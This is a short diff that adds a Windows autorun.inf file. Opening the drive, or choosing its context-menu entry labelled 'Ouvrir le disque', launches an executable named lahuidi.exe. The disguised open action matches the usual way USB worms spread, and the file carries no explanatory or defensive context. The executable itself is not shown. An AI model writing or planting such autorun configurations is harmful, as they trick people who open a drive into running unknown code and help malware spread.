@@ -1,0 +1,5 @@
+[AutoRun]
+open=lahuidi.exe
+shell=start
+shell\start\command=lahuidi.exe
+shell\start=Ouvrir le disque
